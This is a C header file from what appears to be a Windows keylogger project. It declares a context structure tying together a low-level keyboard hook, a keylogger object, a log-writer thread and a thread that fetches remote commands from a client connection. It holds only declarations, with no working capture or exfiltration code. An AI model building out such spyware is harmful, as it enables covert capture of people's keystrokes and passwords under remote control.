
#include "utils.h"
#include "../keylogger/keylogger.h"
#include "../client/client.h"

#ifndef PROGRAM_H
#define PROGRAM_H

#define SLP_CMD_THREAD 22500    // 22.5s
#define SLP_WRITER_THREAD 20000 // 20s


/**
 * Structure that maintains all the important information and structures
 * utilised throughout the program
 */
typedef struct {
    CLIENT_HANDLER* client;  // client handler struct
    KEY_LOGGER* kLogger;     // keylogger struct
    HHOOK hLowLevelKeyHook;  // lowlevel key hook handle
    
    DWORD mainThreadId;   // id of the main thread
    HANDLE hWriteThread;  // handle to log writer thread
    HANDLE hCmdThread;    // handle to remote command retrieval worker thread
    HANDLE hMutexThreadSync;   // thread mutex handle
    
    BOOL shutdown;  // shutdown flag updated in the commands.c source file
    BOOL sleeping;  // if true, the key events will be skipped 
} PROGRAM_CONTEXT;

extern PROGRAM_CONTEXT* progContext;  // Global program context variable

ERR_CODE setup();         // setups up client and program itself
ERR_CODE startThreads();  // initialises worker threads

void programCleanup();    // starts program cleanup
void programContextCleanup(PROGRAM_CONTEXT* prCon); // cleans up PRORGAM_CONTEXT struct

#endif